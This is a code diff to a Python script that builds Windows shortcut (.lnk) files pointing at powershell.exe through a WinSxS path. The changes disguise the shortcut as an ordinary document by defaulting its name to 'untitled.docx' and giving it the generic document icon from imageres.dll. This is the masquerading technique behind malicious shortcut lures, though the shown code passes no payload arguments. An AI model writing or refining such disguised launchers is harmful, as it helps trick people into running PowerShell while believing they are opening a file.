@@ -22,11 +22,12 @@ class Document:
                         file_handle = open(self.document_path, 'rb')
                         break
                     except IOError:
-                        self.document_path = "untitled"
+                        self.document_path = "untitled.docx"
                         continue
 
-        # defualts
-        self.icon_path = "C:\\Windows\\WinSxS\\amd64_microsoft-windows-dxp-deviceexperience_31bf3856ad364e35_10.0.19041.5794_none_bbb825b3af1e2dde\\ringtones.ico"
+        # Defualts
+        self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
+        self.icon_index = 85 # Index within imageres.dll for document icon
 
 def convert_to_os_specific_path(directory):
     try:
@@ -72,7 +73,7 @@ def write_lnk_using_document(target, document):
             arguments=None,
             description=None,
             icon_file=document.icon_path,
-            icon_index=0,
+            icon_index=document.icon_index,
             work_dir=get_directory(document.document_path),
             window_mode=None,
         )
@@ -81,7 +82,6 @@ def write_lnk_using_document(target, document):
         print(f"An error occured while writing .lnk file: {e}")
 
 if __name__ == "__main__":
-    document = Document("testdocument")
+    document = Document(r'testdocument')
     target = "C:\\Windows\\WinSxS\\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.19041.3996_none_dd93276fb79a0397\\powershell.exe"
-
     write_lnk_using_document(target, document)
